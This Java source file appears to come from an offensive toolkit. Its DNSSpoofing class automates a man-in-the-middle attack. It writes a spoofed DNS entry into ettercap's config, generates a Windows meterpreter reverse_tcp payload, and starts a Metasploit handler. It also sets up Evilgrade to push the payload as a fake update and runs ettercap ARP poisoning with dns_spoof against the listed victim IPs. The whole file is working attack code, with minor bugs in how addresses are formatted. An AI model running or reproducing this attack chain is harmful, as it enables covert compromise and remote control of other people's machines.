package exploits.mitm;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

public class DNSSpoofing extends ManInTheMiddle 
{
	
	InetAddress spoofDomain;
	InetAddress lHost;
	String meterpreterLPort;
	String moduleEvilgrade;
	
	public DNSSpoofing(List<String> gatewayIPs, List<String> victimIPs) 
	{
		super(gatewayIPs, victimIPs);
	}
	
	public void setSpoofDomain(String domain) throws UnknownHostException
	{
		// make sure domain is valid
		spoofDomain = InetAddress.getByName(domain);
		// find local host IP
		lHost = InetAddress.getLocalHost();
		BufferedWriter out = null;
		try 
		{
			//find etter.dns
			FileWriter fstream = new FileWriter("/etc/ettercap/etter.dns", true); //true tells to append data.
			out = new BufferedWriter(fstream);
			// add the string specifying the domain and the local ip address
			out.write(domain + " A " + lHost.getHostAddress());
		    if(out != null)
		    {
		        out.close();
		    }
		}
		catch (IOException e)
		{
		    System.err.println("Error: " + e.getMessage());
		}
	}
	
	public void setMeterpreterLPort(String lPort) 
	{
		this.meterpreterLPort = lPort;
	}
	
	public void setModuleEvilgrade(String evilgradeModule) 
	{
             this.moduleEvilgrade = evilgradeModule;
         }
	
	@Override
	public void runAttack() throws IOException 
	{
		String gatewayIPs = "/";
		for (String addr : this.gatewayIPs)
			gatewayIPs += addr + ",";
		// remove final ',' and add "//<space>"
		gatewayIPs = gatewayIPs.substring(0, gatewayIPs.length() - 1) + "// ";
		System.out.println(gatewayIPs);
		
		// do the same for victim IPs
		String victimIPs = "/";
		for (String addr : this.victimIPs)
			victimIPs += addr + ",";
		/* remove final ',' and add "//<space>" */
		victimIPs = victimIPs.substring(0, victimIPs.length() - 1) + "// ";
		System.out.println(victimIPs);
		                         
		// assemble commands in terminal
		// run command in the process with sendProcessInput()
                // display output of the process with readProcessOutput()
                setup();
                
		String payloadCommand = "msfpayload windows/meterpreter/reverse_tcp LHOST=" +
					lHost + " LPORT=" + meterpreterLPort + " R |msfencode -t exe > tmp/agent.exe";
		sendProcessInput(payloadCommand);
		readProcessOutput(payloadCommand, 2000);
		
		String msfcliCommand = "msfcli multi/handler PAYLOAD= windows/meterpreter/reverse_tcp " +
				"LHOST=" + lHost + " LPORT=" + meterpreterLPort + " E";
		sendProcessInput(msfcliCommand);
                readProcessOutput(msfcliCommand, 2000);
               
                //start up Evilgrade
                String evilgradeCommand = "evilgrade";
                sendProcessInput(evilgradeCommand); 
                
                //configure user selected attack-module
                String configureCommand = "configure " + moduleEvilgrade;
                sendProcessInput(configureCommand);
              
                String setCommand = "set agent /tmp/agent.exe";
                sendProcessInput(setCommand);
                // should read "set agent, tmp/agent.exe"
                readProcessOutput(setCommand, 2000);
                
                //start Evilgrade commands
                String startCommand = "start";
                sendProcessInput(startCommand);
                //should read "Webserver ready. Waiting for connection"
                readProcessOutput(startCommand, 2000);
                
                //exit Evilgrade
                String quitCommand = "break";
                sendProcessInput(quitCommand);
                
                //executing attack
                String ettercapCommand = "/opt/ettercap/bin/ettercap -T -q -M arp:remote -P dns_spoof /" 
                                + gatewayIPs + "// /" + victimIPs + "/";
                sendProcessInput(ettercapCommand);
                readProcessOutput(ettercapCommand, 2000);
                
	}
	
}
